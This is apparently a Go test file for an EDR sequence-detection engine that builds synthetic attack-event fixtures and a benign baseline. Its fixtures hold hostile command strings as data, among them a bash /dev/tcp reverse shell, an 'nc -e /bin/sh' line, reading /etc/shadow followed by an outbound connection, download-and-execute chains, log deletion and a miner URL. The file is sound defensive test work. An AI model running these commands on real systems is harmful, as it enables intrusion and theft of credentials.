package edr

import (
	"context"
	"fmt"
	"testing"
	"time"
)

var fxBase = time.Date(2026, 1, 1, 12, 0, 0, 0, time.UTC)
var fxN int

func sq_fxID() string { fxN++; return fmt.Sprintf("x%05d", fxN) }

func sq_fxT(sec int) time.Time { return fxBase.Add(time.Duration(sec) * time.Second) }

func sq_pe(t int, host string, pid int, exe, cmd string) seqEvent {
	return processSeqEvent(Event{ID: sq_fxID(), Time: sq_fxT(t), Host: host, PID: pid, UID: 1000, Executable: exe, Command: cmd})
}
func sq_pu(t int, host string, pid int, exe, cmd string) seqEvent {
	e := sq_pe(t, host, pid, exe, cmd)
	e.F["uid"] = int64(0)
	return e
}
func sq_ne(t int, host string, pid int, dest string) seqEvent {
	return networkSeqEvent(NetworkEvent{ID: sq_fxID(), Time: sq_fxT(t), Host: host, PID: pid, Destination: dest})
}
func sq_fe(t int, host, path, op string) seqEvent {
	return fileSeqEvent(FileEvent{ID: sq_fxID(), Time: sq_fxT(t), Host: host, Path: path, Operation: op})
}
func sq_te(typ string, t int, e TelemetryEvent) seqEvent {
	e.Time = sq_fxT(t)
	s := telemetrySeqEvent(typ, e)
	s.ID = "t:" + sq_fxID()
	return s
}
func sq_auth(t int, host, method, outcome string) seqEvent {
	return sq_te("auth", t, TelemetryEvent{Host: host, Method: method, Outcome: outcome, User: "u"})
}

func exampleFixtures() map[string][]seqEvent {
	h := "h1"
	return map[string][]seqEvent{
		"seq-download-exec":       {sq_pe(0, h, 10, "/usr/bin/curl", "curl http://x/a"), sq_pe(30, h, 11, "/tmp/a", "/tmp/a")},
		"seq-download-chmod-exec": {sq_pe(0, h, 10, "/usr/bin/wget", "wget x"), sq_pe(5, h, 11, "/bin/chmod", "chmod +x /tmp/a"), sq_pe(9, h, 12, "/tmp/a", "/tmp/a")},
		"seq-recon-lateral":       {sq_pe(0, h, 10, "/usr/bin/nmap", "nmap -sS 10.0.0.0/24"), sq_pe(60, h, 11, "/usr/bin/ssh", "ssh root@10.0.0.7")},
		"seq-recon-lateral-auth":  {sq_pe(0, h, 10, "/usr/bin/nmap", "nmap x"), sq_auth(30, h, "ssh", "success")},
		"seq-cron-write-exec":     {sq_fe(0, h, "/etc/cron.d/evil", "create"), sq_pe(20, h, 10, "/usr/bin/crontab", "crontab -l")},
		"seq-systemd-unit-enable": {sq_fe(0, h, "/etc/systemd/system/x.service", "create"), sq_pe(8, h, 10, "/bin/systemctl", "systemctl enable x")},
		"seq-authkeys-ssh":        {sq_fe(0, h, "/root/.ssh/authorized_keys", "modify"), sq_auth(100, h, "ssh", "success")},
		"seq-ldpreload-start":     {sq_fe(0, h, "/etc/ld.so.preload", "modify"), sq_pu(4, h, 10, "/bin/ls", "ls")},
		"seq-ssh-bruteforce": {sq_auth(0, h, "ssh", "failure"), sq_auth(5, h, "ssh", "failure"), sq_auth(9, h, "ssh", "failure"),
			sq_auth(14, h, "ssh", "success")},
		"seq-ssh-failures-until-success": {sq_auth(0, h, "ssh", "failure"), sq_auth(5, h, "ssh", "failure"), sq_auth(9, h, "ssh", "failure")},
		"seq-reverse-shell-net":          {sq_pe(0, h, 77, "/bin/bash", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"), sq_ne(2, h, 77, "1.2.3.4:4444")},
		"seq-python-inline-net":          {sq_pe(0, h, 78, "/usr/bin/python3", "python3 -c import socket"), sq_ne(3, h, 78, "9.9.9.9:80")},
		"seq-powershell-enc-net":         {sq_pe(0, h, 79, "C:\\Windows\\System32\\powershell.exe", "powershell -enc AAAA"), sq_ne(1, h, 79, "8.8.8.8:443")},
		"seq-shadow-exfil":               {sq_pe(0, h, 80, "/bin/cat", "cat /etc/shadow"), sq_ne(5, h, 80, "5.5.5.5:9000")},
		"seq-dns-paste-exec": {sq_te("dns", 0, TelemetryEvent{Host: h, Query: "api.pastebin.com"}),
			sq_pe(20, h, 10, "/tmp/stage", "/tmp/stage")},
		"seq-unsigned-module": {sq_pe(0, h, 81, "/tmp/loader", "/tmp/loader"),
			sq_te("module", 3, TelemetryEvent{Host: h, PID: 81, ModulePath: "/tmp/x.so", Kind: "so", Signed: false})},
		"seq-runkey-start": {sq_te("registry", 0, TelemetryEvent{Host: "w1", Key: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", Operation: "set"}),
			sq_pe(30, "w1", 10, "C:\\Windows\\System32\\WindowsPowerShell\\powershell.exe", "powershell")},
		"seq-file-burst": {sq_fe(0, h, "/home/a/1", "modify"), sq_fe(2, h, "/home/a/2", "modify"), sq_fe(4, h, "/home/a/3", "modify"), sq_fe(6, h, "/home/a/4", "modify")},
		"seq-discovery-trio": {sq_pe(0, h, 10, "/usr/bin/whoami", "whoami"), sq_pe(5, h, 11, "/usr/bin/id", "id"),
			sq_pe(9, h, 12, "/usr/bin/uname", "uname -a")},
		"seq-sudo-useradd": {sq_auth(0, h, "sudo", "success"), sq_pe(30, h, 10, "/usr/sbin/useradd", "useradd bob")},
		"seq-kmod-load": {sq_pe(0, h, 10, "/sbin/insmod", "insmod x.ko"),
			sq_te("module", 5, TelemetryEvent{Host: h, ModulePath: "/lib/x.ko", Kind: "driver", Signed: false})},
		"seq-base64-exec":             {sq_pe(0, h, 10, "/usr/bin/base64", "base64 -d p.b64"), sq_pe(20, h, 11, "/tmp/p", "/tmp/p")},
		"seq-setuid-root-tmp":         {sq_pe(0, h, 10, "/bin/chmod", "chmod u+s /tmp/p"), sq_pu(60, h, 11, "/tmp/p", "/tmp/p")},
		"seq-tmp-write-exec":          {sq_fe(0, h, "/tmp/p", "create"), sq_pe(30, h, 10, "/tmp/p", "/tmp/p")},
		"seq-dns-tld-burst":           {sq_dnsTop(0), sq_dnsTop(10), sq_dnsTop(20), sq_dnsTop(30)},
		"seq-kerb-fail-success":       {sq_auth(0, h, "kerberos", "failure"), sq_auth(60, h, "kerberos", "failure"), sq_auth(120, h, "kerberos", "success")},
		"seq-nc-then-net":             {sq_pe(0, h, 90, "/usr/bin/nc", "nc -e /bin/sh 1.2.3.4 99"), sq_ne(2, h, 90, "1.2.3.4:99")},
		"single-powershell-enc":       {sq_pe(0, h, 10, "C:\\Windows\\System32\\powershell.exe", "powershell -enc ZZZ")},
		"single-history-clear":        {sq_pe(0, h, 10, "/bin/bash", "bash -c history -c")},
		"single-var-log-delete":       {sq_fe(0, h, "/var/log/auth.log", "delete")},
		"single-ssh-tunnel":           {sq_pe(0, h, 10, "/usr/bin/ssh", "ssh -R 8080:localhost:80 x@y")},
		"single-privileged-container": {sq_pe(0, h, 10, "/usr/bin/docker", "docker run --privileged alpine")},
		"single-devshm-exec":          {sq_pe(0, h, 10, "/dev/shm/x", "/dev/shm/x")},
		"single-miner":                {sq_pe(0, h, 10, "/tmp/m", "m --url stratum+tcp://pool:3333")},
		"single-service-create": {sq_te("registry", 0, TelemetryEvent{Host: "w1",
			Key: "HKLM\\SYSTEM\\CurrentControlSet\\Services\\evil", Operation: "create"})},
		"single-unsigned-driver": {sq_te("module", 0, TelemetryEvent{Host: "w1", ModulePath: "evil.sys", Kind: "driver", Signed: false})},
	}
}

func sq_dnsTop(t int) seqEvent { return sq_te("dns", t, TelemetryEvent{Host: "h1", Query: "abc.top"}) }

// benignSet is ordinary activity that none of the non-noisy examples may match.
func benignSet() []seqEvent {
	h := "b1"
	ev := []seqEvent{
		sq_pe(0, h, 1, "/usr/bin/apt", "apt update"), sq_pe(10, h, 2, "/bin/ls", "ls -l"), sq_pe(12, h, 3, "/usr/bin/python3", "python3 app.py"),
		sq_pe(15, h, 4, "/usr/bin/curl", "curl https://example.com/api"), sq_pe(20, h, 5, "/usr/bin/git", "git pull"),
		sq_pe(25, h, 6, "/usr/bin/ssh", "ssh build-server"), sq_pe(30, h, 7, "/usr/bin/vim", "vim notes.txt"),
		sq_pe(35, h, 8, "/usr/bin/whoami", "whoami"),
		sq_ne(16, h, 4, "93.184.216.34:443"), sq_ne(26, h, 6, "10.0.0.5:22"),
		sq_fe(40, h, "/home/dev/notes.txt", "modify"), sq_fe(41, h, "/home/dev/code.go", "modify"), sq_fe(42, h, "/var/log/app.log", "modify"),
		sq_fe(50, h, "/tmp/build.cache", "create"),
		sq_auth(5, h, "ssh", "success"), sq_auth(60, h, "sudo", "success"), sq_auth(70, h, "ssh", "failure"), sq_auth(80, h, "ssh", "success"),
		sq_te("dns", 17, TelemetryEvent{Host: h, Query: "example.com"}),
		sq_te("registry", 90, TelemetryEvent{Host: h, Key: "HKCU\\Software\\App\\Settings", Operation: "set"}),
		sq_te("module", 95, TelemetryEvent{Host: h, ModulePath: "/lib/libc.so", Kind: "so", Signed: true}),
	}
	return ev
}

func runText(t *testing.T, text string, ev []seqEvent) seqResult {
	t.Helper()
	q, err := parseSeq(text)
	if err != nil {
		t.Fatalf("parse %q: %v", text, err)
	}
	if len(q.Problems) > 0 {
		t.Fatalf("problems %q: %+v", text, q.Problems)
	}
	cp := append([]seqEvent(nil), ev...)
	sortSeqEvents(cp)
	return runSeq(context.Background(), q, cp, 500)
}

func TestSeqExamplesCatalogue(t *testing.T) {
	ex := seqExamples()
	if len(ex) < 30 {
		t.Fatalf("need 30+ examples, have %d", len(ex))
	}
	fx := exampleFixtures()
	seen := map[string]bool{}
	for _, e := range ex {
		if seen[e.ID] {
			t.Fatalf("duplicate id %s", e.ID)
		}
		seen[e.ID] = true
		if e.Technique == "" || e.Tactic == "" || e.Description == "" || e.Name == "" {
			t.Errorf("%s: missing metadata", e.ID)
		}
		q, err := parseSeq(e.Query)
		if err != nil {
			t.Errorf("%s: parse: %v", e.ID, err)
			continue
		}
		if len(q.Problems) > 0 {
			t.Errorf("%s: unavailable fields: %+v", e.ID, q.Problems)
			continue
		}
		fixture, ok := fx[e.ID]
		if !ok {
			t.Errorf("%s: no synthetic fixture", e.ID)
			continue
		}
		// synthetic fixture must produce a match
		if r := runText(t, e.Query, fixture); len(r.Matches) == 0 {
			t.Errorf("%s: synthetic fixture produced no match", e.ID)
		}
		// benign set evaluates without error; non-noisy examples must stay silent
		if r := runText(t, e.Query, benignSet()); !e.Noisy && len(r.Matches) != 0 {
			t.Errorf("%s: matched benign activity (%d)", e.ID, len(r.Matches))
		}
		// fixtures + benign mixed: still no timeout
		mixed := append(append([]seqEvent(nil), fixture...), benignSet()...)
		if r := runText(t, e.Query, mixed); r.TimedOut {
			t.Errorf("%s: timed out", e.ID)
		}
	}
	for id := range fx {
		if !seen[id] {
			t.Errorf("fixture for unknown example %s", id)
		}
	}
}
